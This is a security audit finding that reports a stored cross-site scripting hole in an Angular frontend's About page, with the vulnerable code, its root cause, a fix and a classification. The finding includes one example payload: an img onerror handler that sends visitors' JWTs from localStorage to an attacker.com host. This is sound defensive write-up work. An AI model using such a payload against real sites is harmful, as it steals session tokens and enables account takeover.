#### F-007 · Cross-Site Scripting

**Severity:** 🔴 Critical  ·  **Component:** [C-01](#c-01) - Angular SPA Frontend  ·  **Location:** `frontend/src/app/about/about.component.ts:119`

**Issue:** In `about.component.ts` at line 119, user-submitted feedback comments retrieved from the server are wrapped in a `<figcaption>` tag and then passed to `DomSanitizer.bypassSecurityTrustHtml()`, marking the HTML as trusted without any sanitization. Because feedback comments are stored server-side and displayed to all visiting users on the About page, an attacker can submit a comment containing `<img src=x onerror=fetch('https://attacker.com?t='+localStorage.getItem('token'))>` and steal every visitor's JWT from localStorage.

Persistent XSS accessible to all authenticated and unauthenticated visitors; combined with localStorage JWT storage, achieves full account takeover of every affected session.

**Root cause:** Attacker-controlled content is rendered in the victim's browser without sanitization; combined with session tokens held in JavaScript-readable storage, any payload yields immediate account takeover.

**Evidence:** ✓ verified - Line 119 calls `this.sanitizer.bypassSecurityTrustHtml(feedbacks[i].comment)` on unsanitized server-returned HTML, disabling Angular's default XSS protection for this DOM slot.

```typescript
// frontend/src/app/about/about.component.ts:119
          feedbacks[i].comment = `<figcaption><p class="feedback-comment">${
            feedbacks[i].comment
          }</p><div class="feedback-stars">(${this.stars[feedbacks[i].rating]})</div></figcaption>`
          feedbacks[i].comment = this.sanitizer.bypassSecurityTrustHtml(
            feedbacks[i].comment
          )

```

**Fix:** Output-encode untrusted strings at every sink and remove all `bypassSecurityTrustHtml` calls → ❶ [M-044](#m-044) — Encode output instead of bypassing the framework sanitizer

**Classification:** Cross-Site Scripting (XSS) · [CWE-79](https://cwe.mitre.org/data/definitions/79.html) · [OWASP A03:2021](https://owasp.org/Top10/A03_2021/)

